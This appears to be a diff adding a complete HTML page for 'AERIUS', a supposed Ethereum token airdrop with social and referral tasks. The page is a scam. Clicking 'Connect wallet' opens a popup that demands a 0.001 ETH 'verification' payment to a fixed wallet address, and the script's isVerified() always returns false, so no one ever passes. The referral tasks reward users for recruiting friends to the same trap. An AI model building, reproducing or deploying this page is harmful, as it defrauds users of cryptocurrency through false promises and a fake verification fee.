@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AERIUS</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #000;
+            color: #fff;
+        }
+        .header .menu {
+            cursor: pointer;
+        }
+        .header .wallet-button {
+            background-color: #fff;
+            color: #000;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .main {
+            background-color: #32CD32;
+            color: #000;
+            padding: 50px 20px;
+            text-align: center;
+        }
+        .tasks {
+            padding: 20px;
+        }
+        .task {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .task.completed {
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+        }
+        .task .claim-button {
+            background-color: #007bff;
+            color: #fff;
+            padding: 5px 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .task .claim-button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        .popup.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="menu">☰</div>
+        <div>AERIUS</div>
+        <button class="wallet-button">Connect Ethereum Wallet</button>
+    </div>
+
+    <div class="main">
+        <h1>Welcome to AERIUS</h1>
+        <p>AERIUS harnesses the power of Ethereum to revolutionize decentralized finance and create seamless user experiences. With its secure, fast, and eco-friendly blockchain, Ethereum empowers AERIUS to offer reliable and transparent services. Manage assets, complete tasks, and unlock exclusive rewards—all in one platform.</p>
+    </div>
+
+    <div class="tasks">
+        <h2>Social Tasks</h2>
+        <div class="task" id="task1">
+            <span>Connect wallet (2000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('task1')">Claim</button>
+        </div>
+        <div class="task" id="task2">
+            <span>Join the AERIUS Telegram Community (1000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('task2')">Claim</button>
+        </div>
+        <div class="task" id="task3">
+            <span>Follow AERIUS on X (1000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('task3')">Claim</button>
+        </div>
+        <div class="task" id="task4">
+            <span>Check in DAILY (200 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('task4')">Claim</button>
+        </div>
+        <div class="task" id="task5">
+            <span>Create a username (1000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('task5')">Claim</button>
+        </div>
+
+        <h2>Referral Tasks</h2>
+        <div class="task" id="referral1">
+            <span>Invite 1 friend (2000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('referral1')">Claim</button>
+        </div>
+        <div class="task" id="referral2">
+            <span>Invite 5 friends (10000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('referral2')">Claim</button>
+        </div>
+        <div class="task" id="referral3">
+            <span>Invite 10 friends (20000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('referral3')">Claim</button>
+        </div>
+        <div class="task" id="referral4">
+            <span>Invite 50 friends (30000 AERI TOKENS)</span>
+            <button class="claim-button" onclick="completeTask('referral4')">Claim</button>
+        </div>
+    </div>
+
+    <div class="popup" id="verificationPopup">
+        <p>You are not verified. Please make a transaction of 0.001 ETH to verify your wallet and qualify for the airdrop.</p>
+        <p>Ethereum Address: <strong>0xDF5C7039f069bFF5663676FCba709E32C94Ad243</strong></p>
+        <button onclick="closePopup()">Close</button>
+    </div>
+
+    <script>
+        function completeTask(taskId) {
+            const task = document.getElementById(taskId);
+            const button = task.querySelector('.claim-button');
+
+            if (taskId === 'task1' && !isVerified()) {
+                showPopup();
+                return;
+            }
+
+            button.disabled = true;
+            task.classList.add('completed');
+            button.textContent = '✓ Completed';
+        }
+
+        function isVerified() {
+            // Add logic to check wallet verification status
+            return false;
+        }
+
+        function showPopup() {
+            const popup = document.getElementById('verificationPopup');
+            popup.classList.add('active');
+        }
+
+        function closePopup() {
+            const popup = document.getElementById('verificationPopup');
+            popup.classList.remove('active');
+        }
+    </script>
+</body>
+</html>
